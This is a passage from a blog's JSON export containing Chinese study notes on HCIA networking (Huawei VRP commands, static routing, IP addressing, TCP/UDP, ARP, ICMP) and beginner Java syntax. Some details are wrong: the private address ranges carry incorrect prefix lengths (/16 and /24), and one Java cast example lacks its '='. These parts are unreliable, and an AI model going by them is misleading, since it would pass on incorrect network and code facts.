//查看当前保存的配置文件 compare configuration //对比当前配置文件和下次启动配置对比 reset save-configuration //重置配置文件 reboot //重启设备 华为的配置文件都保存在vrpcfg.zip中 系统启动文件查询 命令 功能 display startup 查看系统启动配置参数//升级降级系统 系统启动配置文件修改 命令 功能 startup saved-configuration 配置系统下次启动时使用的配置文件 startup saved-configuration /xxx/yyy/aaa.aaa //更改下次启动配置文件 startup system-software /xxx/yyy/bbb.bbb //更改下次启动系统文件 dis startup VRP系统管理文件传输网络设备可以从服务器获取VRP系统文件，也可以将日志文件、配置文件、保存到服务器作为备份。 文件传输协议FTP（TCP）、TFTP（UDP） 常见的有FTP和TFTP两种； Xlight 软件 创建FTP服务器 windows端 从FTP服务器获取VRP文件更新ftp xxx.xxx.xxx.xxx //远程到ftp服务器 dis ip int b //查看接口IP地址 //配置IP地址 sys int g0/0/1 ip add xxx.xxx.xxx.xxx //下载FTP服务器的文件 get xxx.xxx put xxx.aaa // 报错时，配置服务用户权限没有给 //cisco TFTP server //TFTP协议传输软件 从TFTP服务器获取VRP文件更新//打开 Cisco TFTP server ，开启TFTP服务 tftp xxx.xxx.xxx.xxx get aaa.bbb //下载文件 tftp xxx.xxx.xxx.xxx put aaa.bb //上传文件 路由技术 术语 备注 类比 路由 从源头到目标的路径不同网络间的转发过程 火车 路由表 路由信息的集合路由的依据 时刻表 路由器 具有路由功能的设备 火车站 默认网关 通常是路由设备的接口IP地址 火车站的地址 经过一次路由，TTL减1。 路由过程：IP路由过程 /32 // 代表一个回环口 ip route-static xxx.xxx.xxx.xxx aa yyy.yyy.yyy.yyy //增加路由 // 最长匹配原则 当路由器（或其他三层设备）收到一个IP数据包时，会查看数据包的IP头部中的==目的IP地址==，并在路由表中进行查找，在匹配到最优路由后，将数据包扔给该路由所指的出接口或下一跳。 路由器转发数据包 路由器需要知道下一跳和出接口才能将数据转发出去。 dis ip routing-table protocol static //详细路由情况查询 ==路由选路== 路由器负责为数据包选择一条最优路径，并进行转发； 路由器的工作内容： 收到数据包查看目标IP地址 在路由表中选择最佳路径 维护路由表 路由表解析：dis ip routing-table //查看路由表 // 配路由一定要有图 // 路由表中存放的都是最优的 路由表字段 备注 Destination 目标，用来标识IP包的目标地址或目标网络 Mask 掩码，选择最佳路由的重要判断依据（最长匹配原则） NextHop 下一跳，指明IP包所经路由的下一个路由器的接口地址 Interface 出接口，指明IP包将从该路由器的哪个接口转发出去 Protocol 协议，路由的来源、学习方式 Preference 优先级，比较不同路由来源到达==相同目标网络==的优先级越低越优先 Cost 度量值，比较相同路由来源到达==相同目标网络==的不同路径的优先级越低越优先 路由的优先级 路由度量 等价路由对于同一个路由来源，当达到同一个目标网络有几条相同度量值的路由时，这些路由都会被加入到路由表中，数据包会在这几个链路上进行负载分担。（ECMP） 负载分担：根据路由器的算法选路，源IP和目的IP 最长匹配原则：最终数据包匹配最佳路由的算法 路由表的形成、路由的来源： 路由来源 备注 直连路由 路由器接口上的网络（接口配置了IP地址并且开启） 静态路由 管理员手工添加的网络 动态路由 路由器之间学习到的网络 静态路由配置命令 命令 备注 ip route-static ==目标网络== ==子网掩码==/前缀 ==下一跳/出接口== 配置静态路由 如果出接口为以太网接口，则必须要指定下一跳地址 如果出接口为串口，可以使用下一跳或出接口来配置 切记：通讯是双向的，不要忘记配置返回流量的路由 注意：任何时候能写下一跳就写下一跳 静态路由配置 ip route-s xxx.xxx.xxx.xxx aa bbb.bbb.bbb.bbb//配置静态路由 负载分担 静态路由支持到达同一目标网络的等价负载分担 数据包会在去的时候走一条路，回来的时候走另一条路； 路由备份-浮动静态路由 说明：和负载分担不同的是这两条路的速度可能不一样，一个是千兆，一个是百兆。正常情况走千兆，异常情况走百兆。 利用优先级的特征，配置浮动路由； 在主路失效的情况下，浮动路由会加入到路由表并承担数据转发业务； ip route-static xxx.xxx.xxx.xxx aa bbb.bbb.bbb.bbb preference yyy // 更改优先级 默认是60","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"笔记","slug":"笔记","permalink":"http://sakuramuxia.github.io/tags/%E7%AC%94%E8%AE%B0/"},{"name":"ARP","slug":"ARP","permalink":"http://sakuramuxia.github.io/tags/ARP/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记2","slug":"hcia02","date":"2021-03-30T13:06:13.000Z","updated":"2021-05-03T05:56:44.094Z","comments":true,"path":"post/1b01.html","link":"","permalink":"http://sakuramuxia.github.io/post/1b01.html","excerpt":"","text":"IP地址基础 在IP网络中，通信节点需要一个IP地址 以点分十进制表示，由32位二进制组成； 分为网络位和主机位两部分： ​ 网络位，代表IP地址所属的网段，表示同一个房间； ​ 主机位，代表网段上的某个节点，表示某一个座位； ​ 由子网掩码决定分界点 ； IP地址的分类根据第一组八位二进制 能被主机使用的是ABC三类； D类地址用于组播技术； 0开头的地址代表所有地址或无地址； 127开头的地址代表自己； 私有IP地址空间 地址范围 10.0.0.0/8 10.0.0.0到10.255.255.255 172.16.0.0/16 172.16.0.0到172.31.255.255 192.168.0.0/24 192.168.0.0到192.168.255.255 公网地址 用于Internet，向ISP付费申请，全球唯一 私网地址 用于企业内部网络，不能用于Internet，免费使用，可以重复 地址转换 使用私网地址如果要访问Internet，必须转换为公网地址，该技术称为NAT 子网掩码 区分网络部分和主机部分； 1表示网络位，0表示主机位（ 连续的1和0） 网络地址，主机地址，广播地址：每个网段上都有两个特殊地址（最小和） 网络地址 ==主机位==全为0，代表一个网段（头）比作房间 主机地址 主机位不全为0也不全为1，代表一个网段内的一个节点，比作座位 广播地址 ==主机位==全为1，代表一个网段内的所有节点（尾） 注意： 子网掩码 /32既是主机地址又是网络地址，又是广播地址； 子网掩码把网络地址和主机地址变小或变大； 子网掩码连续的1和连续的0 子网掩码 用于区分网络部分和主机部分； 1表示网络位，0表示主机位（连续的1和0） 在设计网络时使用有类IP地址会造成地址的浪费 不同的网段用路由器 子网划分 满足不同网络对IP地址的需求； 实现网络的层次性； 节省IP地址； 默认子网掩码可以进一步划分，成为变长子网掩码； 即网络位向主机位“借位”； 公式： 数学问题： ​ 块=2^主机位数=256-掩码； ​ 找块最接近主机的倍数（一个小于，一个大于）； 数据转发过程TCP/IP协议簇和底层协议配合，保证了数据能够实现端到端的传输。数据传输过程是一个非常复杂的过程，例如数据在转发的过程中会进行一系列的封装和解封装。 网关：Gateway 位于不同网络间的主机要实现通讯，必须把数据包发送给网关； 网关通常就是一台三层网络设备（路由器、三层交换机、防火墙、服务器）； 网关地址就是设备的接口地址； route print 打印路由表 数据转发过程：数据包在相同网段内或不同网段之间转发所依据的原理基本一致。 TCP封装 当主机建立了到达目的地的TCP连接后，便开始对应用层数据进行封装。 IP封装 查找路由 ARP 通过ARP缓存表找到吓一跳的MAC地址； 如果表项里没有吓一跳的MAC地址，主机A会发送ARP请求； 以太网封装 数据帧转发 网关（RTA）收到帧后，检查==FCS==和目的MAC地址，通过后即系解封帧； FCS：校验 数据包转发过程 网关检查是否具有到达目的网络的路由条目。 如果存在转发路径，则为数据包添加一个新的二层帧头和帧尾，并继续转发。 数据帧解封装 RTB以服务器A的MAC地址作为目的MAC继续转发； 服务器A收到该数据帧后，发现目的MAC为自己的MAC，于是会继续处理该数据帧； 数据包解封装 服务器A检查数据包的目的IP地址，发现目的IP与自己的IP地址相同； 服务器A剥掉数据包的IP头部后会送往上层协议TCP继续进行处理； 数据段解封装 服务器A检查TCP头部的目的端口，然后将数据段发送给应用层的HTTP协议进行处理。 单播、广播、组播根据目标地址判断 单播：一对一； 广播：发送给所属广播域内的所有目标；MAC地址=FFFFFFFFFFFF；IP地址=该网段的广播地址； 组播：发送给一组目标,MAC地址=01-00-5E开头，IP地址=D类组播地址； 接收规则： 接受地址包括本卡MAC地址、广播地址和本机所属组播组地址； 网卡丢弃与本卡接收地址不匹配的帧； 网卡解开与本卡接收地址匹配的帧，将数据递交给上层处理； 交换机有MAC地址表； 路由器有IP路由表； 集线器：信号复制器，物理层； 集线器：不分冲，不分广；（冲突域，广播域）； 交换机：分冲，不分广； 路由器：分冲，分广； 冲突域（上），广播域（下）个数。 VRP基础dis version //查看设备硬件信息 d th // dis http services state //查看HTTP服务是否打开 dis vlan //查看VLAN sysname xxx //配置名字 dis users // 查看使用用户名 交换机可以隔离冲突域，路由器可以隔离广播域，这两种设备在企业网络中应用十分广泛，VRP（Versatile Routing Platfrom）通用路由平台是华为公司数据通信产品的通用操作系统平台。 管理形式 备注 本地管理Local 通过Console线连接Console或MINI USB口，终端使用==Serial协议==适合初始化，故障处理，系统升级，同时只能支持==一个会话。== 远程管理Remote 通过IP地址或域名联机虚拟==VTY口==，使用T==elnet或SSH协议==适合后期维护、异地管理、同时可以支持多个会话、 VRP基础配置 设备初始化启动： dis ip int b // 命令行视图 命令行帮助 命令快捷键ctrl + a //把光标移动到当前命令行的最前端 ctrl + e //把光标移动到当前命令的最后端 ctrl + c //停止当前命令的运行 ctrl + z //回到用户视图 ctrl + ] //终止当前连接或切换连接 视图的切换 命令 功能 system-view 从用户视图进入系统视图 quit 从系统视图返回到用户视图 return 从任意的非用户视图返回到用户视图 sys // 系统视图 int lo 1 //配置接口 ospf 1 //配置路由 sys xxx //自定义名字 //配置IP地址，首先需要进接口模式 int lo 1 ip add xxx.xx.xx.xx xx //配置其他模式的，先退出模式,再配置，也可以直接配置。 q //简写 = interface = int //敲白板 历史命令的调用 命令 功能 display history-command 显示历史命令 上光标 调用上一条历史命令 下光标 调用吓一跳历史命令 上下键 白板复制修改即可 dis hi + \"TAB\"= dis history command 基本配置步骤配置设备名称 命令 功能 sysname 配置设备名称 配置系统时钟 命令 功能 clock timezone 设置所在时区 clock datetime 设置当前时间和日期 clock daylight-saving-time 设置采用夏时刻 //用户模式的状态下 clock timezone BJ add 08:00:00 clock datetime 10:20:30 2021-03-30 display clock // 查看时间 配置标题消息 命令 功能 header login 配置在用户登陆前显示的标题消息 header shell 配置在用户登录后显示的标题消息 header login information \"xxxxx\"; header shell information \"xxxxx\"; header login information \"/回车 xxxxx /回车\" 用户界面 命令 功能 display version 显示系统版本 display users 显示已连接的终端用户 display this 显示当前视图的运行配置 display diagnostic-information 显示设备所有状态信息 system-view user-interface vty 0 4 配置用户界面命令 命令 功能 idle-timeout 设置超时时间 screen-length 设置指定终端屏幕的临时显示行数 history-command max-size 设置历史命令缓存区的大小 配置登陆权限 命令 功能 user privilege 配置指定用户界面下的用户级别 set authentication password 配置本地认证密码 命令等级 用户等级 命令等级 名称 0 0 访问级 1 0 1 监控级 2 0 1 2 配置级 3-15 0 1 2 3 管理级 配置接口IP地址 命令 备注 display [IP] interface brief 查看接口摘要信息 // 简称 dis int b // *down=人为手动关闭 // undo 关闭命令 dis ip int b // 三层口，显示有IP dis mac-address 状态信息查询 命令 功能 display version 显示系统版本 display users 显示已连接的终端用户 display this 显示当前视图的运行配置 ==display diagnostic-information== 显示设备所有状态信息 d th //这个模块配置的东西 说明：思科 show = display display diagnostic-information xxx.txt //把显示信息保存在文件中 VRP远程管理telnet应用场景Telnet可以通过终端对本地和远程的网络设备进行集中管理","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"笔记","slug":"笔记","permalink":"http://sakuramuxia.github.io/tags/%E7%AC%94%E8%AE%B0/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记1","slug":"hcia01","date":"2021-03-29T16:53:06.000Z","updated":"2021-05-03T05:55:59.842Z","comments":true,"path":"post/1a41.html","link":"","permalink":"http://sakuramuxia.github.io/post/1a41.html","excerpt":"","text":"开始计算机网络的定义计算机网络是一组自治计算机互联的集合 网络的组成设备Device；介质Media；报文Date；协议Protocol；信息源source（发送方）和信息目Destination（接收方）； 网络的演进ISP：Internet Services Provider，因特网服务提供商； 最后一公里接入：宽带； 网络的类型覆盖范围不同组网技术不同（二层 物理层 数据链路层） 协议网络通信中的语言：汉语英语； note：ping IP地址 -t 一直ping 网络拓扑用来面熟网络结构（网络类型、设备类型、设备数量、线缆、带宽、服务、数据走向） 拓扑类型点到点；星型； 网络模型网络打通：路由、交换技术即可； 防火墙可以替代路由器； 分层思想==将复杂的流程分解为几个功能相对单一的子过程==； 网络标准化规范不同的互联标准，兼容； 两大模型==OSI模型：== 物理层，数据链路层，网络层，传输层，会话层，表示层，应用层（七层）； ==协议位于的层数：== DNS，HTTP， 位于应用层； TCP/IP，UDP，位于传输层； IP，ICMP，位于网络层； ==TCP/IP模型：== 排查问题可以从 网络模型从下往上排查，或者从上往下排查； 抓包工具可以使用wireshark或科来工具进行抓包； 选择好网卡，选择筛选器，选择要抓包的协议类型：icmp，http，dns。 数据的封装和解封 封装：应用数据需要经过每一层处理后通过网络传输到目的端； OSI把每一层数据称为PDU（protocol Data Unit，协议数据单元）； TCP/IP根据不同层分别使用了段，包，帧，比特。 逐层向下传递数据，并添加报文和报尾的过程称为封装（打包）； 反之，接收方需要逐层向上传递数据，称为解封（拆包）； 常用的应用层协议 DNS HTTP SMTP与POP3/IMAP Telnet FTP与TFTP DNS： Domain Name System，域名解析系统； 建立IP地址与域名之间的映射关系； 将域名解析为IP地址； 将IP地址解析为域名； 常见的DNS服务器：114.114.114.114/ 223.5.5.5/223.6.6.6/180.76.76.76 DNS专门调试模式： nslookup //再输入域名 ipconfig/displaydns //查看DNS缓存 ipconfig/flushdns //清空DNS缓存 HTTP 协议 超文本传输协议 帮助客户端访问万维网 网页浏览器通过翻译HtML文件来表现文本、图像、音乐、动画及视频等对象、 第六讲抓包练习； SMTP与POP3：邮件服务 协议 备注 SMTP Simple Mail Transfer Protocol，简单邮件传输协议 POP3 Post Office Protocol v3，邮局协议版本3 IMAP Internet Message Access Protocol，互联网邮件访问协议 Telnet协议：终端协议远程管理的主要协议（网络设备、服务器、数据库） 常用终端工具有：SecureCRT、Putty、Xshell telnet应该开了这个服务才能响应； FTP和TFTP 协议 备注 FTP File Transfer Protocol，文件传输协议 TFTP Trivial File Transfer Protocol，简单文件传输协议，不可靠； FTP://服务器的IP或域名/路径/文件名 FTP://用户名:密码:@IP或域名:端口号 传输层传输层定义了主机应用程序之间端到端的连通性，传输层中最为常见的两个协议分别是传输控制协议TCP（Transmission Control Protocol）和用户数据包协议UDP（User Datagram Protocol） 传输层概述 传输层提供端到端的连接： 网络层提供点到点的连接： 传输层端口（port）==怎么查看自己或者目标服务器的端口是否打开==； 端口号用于区分不同的网络服务； 端口号一共有 0 ~ 65535个（2的16次方） 既使用TCP和UDP的服务是DNS； 源端口随机分配，目标端口使用知名端口； 应用客户端使用的源端口号一般为系统中未使用的且大于1023； 目的端口号为服务端开启的服务所侦听的端口，如HTTP缺省使用80； 注意： ping不同有可能是防火墙是开着的； 开着哪些服务，哪些端口是开着的； 传输层要搞明白三个东西：==端口号，TCP/UDP,DNS；== DNS既 会用到TCP也会用到UDP； ping是网络层的技术； telnet（TCP协议）命令 可以探测端口是否开启:IP加端口； 端口扫描：portScanner&amp;stuff工具软件； 常见的协议端口号： 传输层协议 协议 备注 TCP Transmission Control Protocol，传输控制协议； UDP User Datagram Protocol，用户数据报协议； TCP UDP数据包结构对比 TCPTCP是一种==面向连接==的传输层协议，提供==可靠==的传输服务； TCP会话建立－三次握手 类似于打电话： 甲：你好，你是小王吗？ 乙：是的，你是老李吗？ 甲：是的。 TCP会话的确认 TCP会话的拥塞和流量控制 TCP会话的终止-四次挥手 UDP TCP和UDP的对比： 传输控制协议（TCP） 用户数据报协议（UDP） 面向连接 无连接 可靠传输 尽力而为的传输 支持流控及窗口机制 无流控及窗口机制 Http，FTP等 TFTP，DNS，DHCP等 数据链路层与以太网（二层）以太网：Ethnet，当今主导地位的局域网组网技术； 网络标准： 数据链路层的分层设计 LLC Logical Link Control 逻辑链路控制：负责识别网络层的协议类型，接收上层数据包封装后帧后，向下层传递； MAC Media Access Control，介质访问控制；处理硬件设备的物理寻址，定义网络拓扑及数据帧的传递顺序 以太网的帧结构： 说明： 0800表IPV4；86DD代表IPV6；0806代表ARP ping 会产生ICMP协议的包；ping IP -l 2000 网络层ARP：Address Resolution Protocol，地址解析协议，获取MAC地址的东西； 网络设备有数据要发送给另一台网络设备时，必须要知道对方而网络层地址（IP地址）。IP地址由网络层来提供，但是仅有IP地址是不够的，IP数据报文必须封装成帧才能通过数据链路进行发送。数据帧必须要包含目的MAC地址，因此发送端还必须获取到目的MAC地址，通过目的IP地址而获取目的MAC地址的过程是由ARP协议来实现的。 数据链路层在进行数据封装时，需要目的MAC地址。 arp -a //查看缓存MAC arp -d //清除缓存MAC 说明： MAC：FFFFFFFFFFFF或全0代表广播； 自己问自己，得到回复则代表地址冲突； ICMPInternet控制报文协议，ICMP是网络层的一个重要协议，ICMP协议用来在网络设备间传递各种差错和控制信息，他对于收集各种网络信息、诊断和排除各种网络故障具有至关重要的作用。使用基于ICMP的应用时，需要对ICMP的工作原理非常熟悉。 用于可达性测试； 使用ping命令调用； ping命令的结果： //无法访问主机 //请求超时 防火墙开启了 //传输失败 网关失败 是否在同一个地址段， 在同一个地址段，不需要通过网关直接能ping同； 不在同一个地址段，需要网关找相关的路由； 网关MAC是否有问题； IP协议internet protocol 因特网协议； 网络层位于数据链路层与传输层之间，网络层中包含了许多协议，其中最为重要的协议就是IP协议，网络层提供了IP路由功能，理解IP路由除了要熟悉IP协议的工作机制之外，还必须理解IP编址以及合理地使用IP地址来设计网络； IP的包头结构： 协议号用于标识上层协议; 分片当数据包比链路MTU大时，就可以被被分解为很多的足够小片段的过程； ping命令： ping IP -l 数据包大小; //IPV4可以分段; //IPV6不可以分段; ping IP -f //不允许分片； TTL 生存时间 Time to Live 生存时间； 防止IP数据包在网络内无休止地传输（环路）； 没经过一次路由TTL值就会减1； 当TTL=0的时候，就丢弃数据包； 利用TTL特性，可以实现路由跟踪技术，排错的重要方法之一； ping -i tracert -d //常用重要命令9 TTL的默认值255；64；128； 说明： 网关就相当于一条默认路由； TTL的代码是11,0； 问题： 一去一回TTL会不会两倍消失？ IP地址在IP网络中，通信节点需要一个IP地址； 以点分十进制，由32位二进制 分为网络位和主机位两部分: 网络位，代表IP地址所属的网段； 主机位，代表网段上的某个节点； ​ 由子网掩码决定分界点； 类似为电话号码，国际号，区号，号码； IP地址的分类：根据第一组八位二进制 127是一个环回网卡，回环 是自己； 测试TCP/IP协议栈 组件是否安装；","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"笔记","slug":"笔记","permalink":"http://sakuramuxia.github.io/tags/%E7%AC%94%E8%AE%B0/"}],"author":"SakuraMuxia"},{"title":"Java学习笔记1","slug":"java01","date":"2021-03-29T16:53:06.000Z","updated":"2021-05-03T06:09:57.675Z","comments":true,"path":"post/3326.html","link":"","permalink":"http://sakuramuxia.github.io/post/3326.html","excerpt":"","text":"预知Java语言跨平台原理在需要运行java应用程序的操作系统上，安装一个与操作系统对应的java虚拟机java virtual machine 即可。 jre jdk 的概念1、JRE 是java程序运行时的环境，包含JVM和运行时所需要的核心类库。 我们想要运行一个已知的java程序，那么只需要安装JRE即可。 2、jdk是java程序开发工具包，包含JRE和开发人员使用的工具。 其中的开发工具：编译工具（javac.exe）和运行工具（java.exe）。 jre jdk和JVM的关系JDK的下载和安装官网：www.oracal.com ==JDK安装中，安装路径不要包含中文和空格。所有的开发工具最好安装目录统一。== ==bin 目录 jdk 的各种工具命令。重点掌握== 常用DOS命令​ cmd 盘符名称: 盘符切换 dir 查看当前路径下的内容 cd 进入单级目 cd.. 回退到上一级目录 cd \\ 回退到盘符目录 cls 清屏 exit 退出命令提示符窗口 cd 目录1\\目录2\\目录3… 进入多级目录。 Path 环境变量的配置验证 javac java 正式开始注释注释的分类 ​ 单行注释 ／／ ​ 多行注释 ／＊ ＊／ ​ 文档注释 ／＊＊ ＊／ 暂时不讲 /* Java程序中最基本的组成单元是类， 类的定义格式 public class 类名 { } 这是我定义的Helloworld类 */ public class Helloworld{ public static void main(String[] args){ /* 这是main方法 main方法是程序的入口方法，代码的执行是从main方法开始的 */ // 这是输出语句，\"\"里面的内容是可以改变的 System.out.println(\"HelloWorld\"); } } 关键字被java语言赋予了特定含义的单词 关键字的特点 关键字的字母全部小写 常用的代码编辑器，针对关键字有特殊的颜色标记，非常直观。 常量常量在程序运行过程中，其值不可以发生改变的量。 常量分类 常量类型 说明 举例 字符串常量 用双引号括起来的内容 “HelloWorld” 整数常量 不带小数的数字 123 小数常量 带小数的数字 12.21 字符常量 用单引号括起来的内容 ‘’ 布尔常量 布尔值，表示真假 true,false 空常量 一个特殊的值，空值 null 注意：空常量是不能直接输出的。 数据类型数据类型内存占用和取值范围注意：给一个整数，默认是int类型的，给一个浮点数，默认是Double类型的。 变量变量变量：在程序运行过程中，其值可以发生改变的量。 变量定义数据类型 变量名 = 变量值； int a = 10; 变量的使用注意事项 main方法进来这一类，变量名不能重复； 定义变量的时候要赋值； long类型定义后，后面加一个L，因为默认是int类型； float类型定义后，后面要加一个F，因为默认是double类型； 标识符标识符给类，方法，变量等起名字的符号； 标识符的定义规则 由数字、字母、下划线_和美元符组成 不能以数字开头 不能是关键字 区分大小写 常见命名约定小驼峰命名法：方法、变量 标识符是一个单词的时候，首字母小写； 标识符由多个单词组成的时候，第一个单词首字母小写，其他单词首字母大写； 大驼峰命名法：类 标识符是一个单词的时候，首字母大写； 标识符由多个单词组成的时候，每个单词的首字母大写； 类型转换自动类型转换表示把一个数据范围小的数值或者变量赋值给另一个表示数据范围大的变量； 注意：byte到char是不可以的，类型不兼容。 强制类型转换表示把一个数据范围大的数值或者变量赋值给另一个表示数据范围小的变量； 格式：目标数据类型 变量名 = （目标数据类型）值或者变量 范例： int k (int)88.88; 运算符算术运算符 符号 作用 + 加 - 减 * 乘 / 除 % 取余 注意：/ 和% 的区别：两个数据做除法，/取结果的商，%取结果的余数； 整数操作只能得到整数，要想得到小数，必须有浮点数参与运算； 字符的 “+”操作字符串的“+”操作赋值运算符int i = 10; i += 20;//把左边和右边的数值做加法操作，结果赋值给左边；包含了强制类型转换 i = i + 20;//int类型是一样的但是又不完全一样； short ==*注意：扩展的赋值运算符（+= -= = /= ）隐含了强制类型转换；== 自增自减运算符 符号 作用 说明 ++ 自增 变量的值加1 – 自减 变量的值减1 注意： ++和–既可以放在变量的后边，也可以放在变量的前边； 单独使用的时候，++和–无论是放在变量的前边还是后边，结果是一样的； ==参与操作的时候，如果放在变量的后边，先拿变量参与操作，后拿变量做++或者–；== ==参与操作的时候，如果放在变量的前边，先拿变量做++或者–，后拿变量参与操作；== 最常见的用法：单独使用； 关系运算符 符号 说明 == 判断表达式的值是否正确，成立为true，不成立为false != 判断表达式的值是否正确，成立为true，不成立为false &gt; 判断表达式的值是否正确，成立为true，不成立为false &gt;= 判断表达式的值是否正确，成立为true，不成立为false &lt; 判断表达式的值是否正确，成立为true，不成立为false &lt;= 判断表达式的值是否正确，成立为true，不成立为false 注意： 关系运算符的结果都是boolean类型，要么是true，要么是false； 千万不要把”==“误写成”=“； 逻辑运算符是用来连接关系表达式的运算符。 当然，逻辑运算符也可以直接连接boolean类型的常量或者变量。 基本逻辑运算符 符号 作用 说明 &amp; 逻辑与 有false则false | 逻辑或 有true则true ^ 逻辑异或 相同为false，不同为true ! 逻辑非 结果正好相反 短路逻辑运算符 符号 作用 说明 &amp;&amp; 短路与 有false则false，但是具有短路效果 || 短路或 有true则true，但是具有短路效果 ==注意区别：== 逻辑与&amp;，无论左边真假，右边都要执行； 短路与&amp;&amp;，如果左边为真，右边执行，如果左边为假，右边不执行； 逻辑或|，无论左边真假，右边都要执行； 短路或||，如果左边为假，右边执行；如果左边为真，右边不执行； 三元运算符 //关系表达式?表达式1:表达式2; a > b ? a : b; //首先计算关系表达式的值； //如果值为true，表达式1的值就是运算结果 //如果值为false，表达式2的值就是运算结果 数据输入 Scanner使用的基本步骤 导包 import java.util.Scanner; ==导包的动作必须出现在类定义的上边；== 创建对象 Scanner sc = new scanner(System.in); ==上面这个格式里面，只有sc是变量名，可以变，其他的都不允许变；== 接受数据 int i = sc.nextInt(); ==上面这个格式里面，只有i是变量名，可以变，其他的都不允许变；== 分支语句流程控制流程控制语句分类 顺序结构：从上到下，从左到右； 分支结构：if switch语句； 循环结构：for循环，while，do …while循环； If语句//格式1 if(关系表达式){ 语句体； } //格式2 if(关系表达式){ 语句体1; }else{ 语句体2; } //格式3 if(关系表达式1){ 语句体1; }else if(关系表达式2){ 语句体2; }else if(关系表达式3){ 语句体3; }else{ 语句体n+1; } 执行流程： 格式1： 首先计算关系表达式的值； 如果关系表达式的值为true就执行语句体； 如果关系表达式的值为false就不执行语句体； 继续执行后面的语句内容； 格式2： 首先计算关系表达式1的值； 如果值为true就执行语句体1，值为false就执行语句体2； 继续执行后面的语句内容； 格式3： 首先计算关系表达式的值； 如果关系表达式的值为true就执行语句体1； 如果关系表达式的值为false就执行关系表达式2； 如果关系表达式的值为true就执行语句体2； 如果关系表达式的值为false就执行关系表达式3； … 如果没有任何 关系表达式为true，就执行语句体n+1； ==注意：数据测试时，选择正确数据，边界数据，错误数据；== switch语句//格式 switch(表达式){ case 值1: 语句体1; break; case 值2: 语句体2; break; case 值3: 语句体3; break; default: 语句体n+1; [break;] } 说明： 表达式：取值为byte，short，int，char，JDK5以后可以是枚举，JDK7以后可以是String。 case：后面跟的是要和表达式进行比较的值； break：表示中断，结束的意思，用来结束switch语句； default：表示所有情况都不匹配的时候，就执行该处的内容，和If语句的else相似； 注意： ==在switch语句中，如果case控制的语句体后面不写break，将出现穿透现象，在不判断下一个case值的情况下，向下运行，直到遇到break，或者整体switch语句结束；== 循环结构循环结构的组成 初始化语句； 条件判断语句；boolean类型 循环体语句； 条件控制语句； for循环语句格式//格式 for(初始化语句;条件判断语句;条件控制语句){ 循环体语句; } 执行流程： 执行初始化语句； 执行条件判断语句，看结果是否是true还是false； 如果是false，循环结束。 如果是true，继续执行。 执行循环体语句； 执行条件控制语句； 回到2继续； 案例：水仙花数：任意数字的指定位上的数值如何求 ==先使用整除操作将要求的数字移动到个位上，在使用取余操作取出最后一位上的值== 例如：1234==5==679 先整除10000得到12345，再对10取余得到5； while 循环语句//格式 初始化语句 while(条件判断语句){ 循环体语句; 条件控制语句; } 执行流程： 执行初始化语句； 执行条件判断语句，看结果是true还是false； 如果是true，继续执行； 如果是false，循环结束； 执行循环体语句； 执行条件控制语句； 回到2继续； do while 循环语句//格式 初始化语句; do{ 循环体语句; 条件控制语句; }while(条件判断语句); 执行流程： 执行初始化语句； 执行循环体语句； 执行条件控制语句； 执行条件判断语句，看结果是true还是false； 如果是false，循环结束； 如果是true，继续执行； 回到2继续； 三种循环的区别： for循环和while循环先判断条件是否成立，然后决定是否执行循环体（先判断后执行） do…while循环先执行一次循环体，然后判断条件是否成立，是否继续执行循环体（先执行后判断） for和while的区别： 条件控制语句所控制的自增变量，因为归属for循环的语法结构，在for循环结束后，就不能再次被访问了。 条件控制语句所控制的自增变量，对于while循环来说不归属其语法结构中，在while循环结束后，该变量还可以继续使用。 条件控制语句 continue 用在循环中，基于条件控制，跳过某次循环体内容的执行，继续下一次的执行； break 用在循环中，基于条件控制，终止循环体内容的执行，也就是结束当前的整个循环； 循环嵌套循环里嵌套循环，内层循环看成一个语句体； RandomRandom的作用和使用步骤作用：用于产生一个随机数 使用步骤： ​ 1.导包 import java.util.Random //导包的动作必须出现在类定义的上面； ​ 2.创建对象 Random r = new Random(); //上面这个格式里面，r是变量名，可以变，其他的都不允许变； ​ 3.获取随机数 int number = r.nextInt(10);//获取数据的范围：[0,10)包括0，不包括10 //上面这个格式里面，number是变量名，可以变，数字10可以变，其他的都不允许变","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://sakuramuxia.github.io/tags/%E7%AC%94%E8%AE%B0/"},{"name":"java","slug":"java","permalink":"http://sakuramuxia.github.io/tags/java/"}],"author":"SakuraMuxia"}],"categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Kali","slug":"Kali","permalink":"http://sakuramuxia.github.io/tags/Kali/"},{"name":"-调音台","slug":"调音台","permalink":"http://sakuramuxia.github.io/tags/%E8%B0%83%E9%9F%B3%E5%8F%B0/"},{"name":"H.323","slug":"H-323","permalink":"http://sakuramuxia.github.io/tags/H-323/"},{"name":"SIP","slug":"SIP","permalink":"http://sakuramuxia.github.io/tags/SIP/"},{"name":"SMC","slug":"SMC","permalink":"http://sakuramuxia.github.io/tags/SMC/"},{"name":"MCU","slug":"MCU","permalink":"http://sakuramuxia.github.io/tags/MCU/"},{"name":"OSPF外部路由","slug":"OSPF外部路由","permalink":"http://sakuramuxia.github.io/tags/OSPF%E5%A4%96%E9%83%A8%E8%B7%AF%E7%94%B1/"},{"name":"OSPF Stub","slug":"OSPF-Stub","permalink":"http://sakuramuxia.github.io/tags/OSPF-Stub/"},{"name":"OSPF Totally-Stub","slug":"OSPF-Totally-Stub","permalink":"http://sakuramuxia.github.io/tags/OSPF-Totally-Stub/"},{"name":"OSPF NSSA","slug":"OSPF-NSSA","permalink":"http://sakuramuxia.github.io/tags/OSPF-NSSA/"},{"name":"OSPF 